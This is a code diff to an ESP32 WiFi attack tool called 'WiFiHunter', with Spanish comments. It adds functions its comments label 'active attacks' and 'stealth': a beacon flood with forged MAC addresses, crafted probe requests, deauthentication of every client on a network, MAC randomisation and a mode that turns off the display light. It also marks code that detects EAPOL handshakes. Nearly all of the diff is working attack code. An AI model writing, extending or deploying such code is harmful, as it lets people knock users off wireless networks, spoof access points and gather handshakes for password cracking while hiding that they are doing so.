@@ -1,5 +1,4 @@
 #include "WiFiHunter.h"
-#include "esp_wifi.h"  // Añadir este include para las funciones de WiFi
 
 WiFiHunter* WiFiHunter::instance = nullptr;
 HandshakeCallback WiFiHunter::handshakeCB = nullptr;
@@ -126,6 +125,112 @@ void WiFiHunter::sendDeauthFrame(const uint8_t* bssid, const uint8_t* clienteMac
     }
 }
 
+// ---- Mejora 1: Ataques activos ----
+
+void WiFiHunter::beaconFlood(const char* ssid, int numBeacons) {
+    uint8_t beaconFrame[256];
+    int frameLen = 0;
+    
+    beaconFrame[0] = 0x80;
+    beaconFrame[1] = 0x00;
+    beaconFrame[2] = 0x00;
+    beaconFrame[3] = 0x00;
+    
+    uint8_t fakeMAC[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01};
+    memcpy(&beaconFrame[4], fakeMAC, 6);
+    memcpy(&beaconFrame[10], fakeMAC, 6);
+    memcpy(&beaconFrame[16], fakeMAC, 6);
+    
+    memset(&beaconFrame[24], 0, 12);
+    
+    int lenSSID = strlen(ssid);
+    beaconFrame[36] = 0x00;
+    beaconFrame[37] = lenSSID;
+    memcpy(&beaconFrame[38], ssid, lenSSID);
+    
+    int offset = 38 + lenSSID;
+    beaconFrame[offset] = 0x01;
+    beaconFrame[offset+1] = 4;
+    beaconFrame[offset+2] = 0x82;
+    beaconFrame[offset+3] = 0x84;
+    beaconFrame[offset+4] = 0x8B;
+    beaconFrame[offset+5] = 0x96;
+    
+    frameLen = offset + 6;
+    
+    for (int i = 0; i < numBeacons; i++) {
+        fakeMAC[5] = random(0x00, 0xFF);
+        memcpy(&beaconFrame[10], fakeMAC, 6);
+        memcpy(&beaconFrame[16], fakeMAC, 6);
+        esp_wifi_80211_tx(WIFI_IF_STA, beaconFrame, frameLen, false);
+        delay(1);
+    }
+    Serial.printf("Beacon Flood con SSID '%s' enviado (%d tramas)\n", ssid, numBeacons);
+}
+
+void WiFiHunter::sendProbeRequest(const char* ssid) {
+    uint8_t probeFrame[256];
+    int lenSSID = strlen(ssid);
+    int frameLen = 24 + 2 + lenSSID;
+    
+    probeFrame[0] = 0x40;
+    probeFrame[1] = 0x00;
+    probeFrame[2] = 0x00;
+    probeFrame[3] = 0x00;
+    
+    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    uint8_t nuestraMac[6];
+    esp_wifi_get_mac(WIFI_IF_STA, nuestraMac);
+    
+    memcpy(&probeFrame[4], broadcast, 6);
+    memcpy(&probeFrame[10], nuestraMac, 6);
+    memcpy(&probeFrame[16], broadcast, 6);
+    
+    probeFrame[24] = 0x00;
+    probeFrame[25] = lenSSID;
+    memcpy(&probeFrame[26], ssid, lenSSID);
+    
+    esp_wifi_80211_tx(WIFI_IF_STA, probeFrame, frameLen, false);
+    Serial.printf("Probe Request enviado para SSID: %s\n", ssid);
+}
+
+void WiFiHunter::deauthAllClients(const RedInfo& red, int numPaquetes) {
+    deauth(red, nullptr, numPaquetes);
+    Serial.printf("Deauth a todos los clientes de %s\n", red.ssid);
+}
+
+// ---- Mejora 7: Sigilo ----
+
+void WiFiHunter::setSilentMode(bool enable) {
+    silentMode = enable;
+    if (silentMode) {
+        pinMode(TFT_LED_PIN, OUTPUT);
+        digitalWrite(TFT_LED_PIN, LOW);
+        Serial.println("Modo sigiloso activado");
+    } else {
+        digitalWrite(TFT_LED_PIN, HIGH);
+        Serial.println("Modo sigiloso desactivado");
+    }
+}
+
+void WiFiHunter::randomizeMAC() {
+    uint8_t newMac[6];
+    newMac[0] = 0x02;
+    newMac[1] = random(0x00, 0xFF);
+    newMac[2] = random(0x00, 0xFF);
+    newMac[3] = random(0x00, 0xFF);
+    newMac[4] = random(0x00, 0xFF);
+    newMac[5] = random(0x00, 0xFF);
+    esp_wifi_set_mac(WIFI_IF_STA, newMac);
+    Serial.println("MAC aleatoria asignada");
+}
+
+void WiFiHunter::setLED(bool state) {
+    digitalWrite(TFT_LED_PIN, state ? HIGH : LOW);
+}
+
+// ---- Callback y gestión de clientes ----
+
 void WiFiHunter::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
     wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
     uint8_t *frame = pkt->payload;
@@ -138,6 +243,7 @@ void WiFiHunter::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type
     uint8_t* addr2 = &frame[10];
     uint8_t* addr3 = &frame[16];
     
+    // Detectar handshake EAPOL
     if (len > 100) {
         int offset = 24;
         for (int i = offset; i < len - 8; i++) {
